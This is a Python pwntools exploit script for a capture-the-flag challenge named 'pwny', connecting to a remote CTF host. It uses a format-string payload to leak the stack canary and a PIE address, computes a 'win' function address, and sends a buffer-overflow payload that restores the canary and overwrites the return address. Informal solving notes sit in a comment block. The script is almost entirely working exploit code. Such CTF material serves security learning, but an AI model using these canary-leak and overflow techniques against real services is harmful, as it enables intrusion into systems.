from pwn import *

# Credits: Knittinggirl

#target = process('./pwny')
elf = ELF('pwny')
#pid = gdb.attach(target, 'b *name_pony+149\nb *name_pony+187\ncontinue')
target = remote('kubenode.mctf.io', 30012)
print(target.recvuntil('name: '))
payload = b'%p' * 30

# 0x5637e614c35e
'''

should look smt like this
0xdf48eb767f491300

mine kept consistently looking like this:
0x7f5330dba000
df 48 eb 76 7f 49 13 00
1, 2, 3, 4, 5, 6, 7, null byte --> we know it has to be this bcs 8 bytes + null byte at the end of it
7f 53 30 db a0 00
1, 2, 3, 4, 5, 6, 7
OHHH ur rihgt
the seocnd one is only 7 long

'''


# in the same memory region of the function we're trying to Ret2Win
payload = b'%19$p%27$p'
target.sendline(payload)

canary = int(target.recv(18), 16)
leak = target.recv(14)

# NOTE: calculating the WIN addr
pie = int(leak, 16) - elf.sym['main']
win = pie + elf.sym['win']


print(hex(win))
print(hex(canary))

#try to get a pie leak

print(target.recvuntil(b', that'))
print(target.recvuntil(b'name:'))

payload = cyclic(0x80)
padding = b'a' * 72
payload = padding
payload += p64(canary)
payload += p64(canary)
payload += p64(win)


target.sendline(payload)

target.interactive()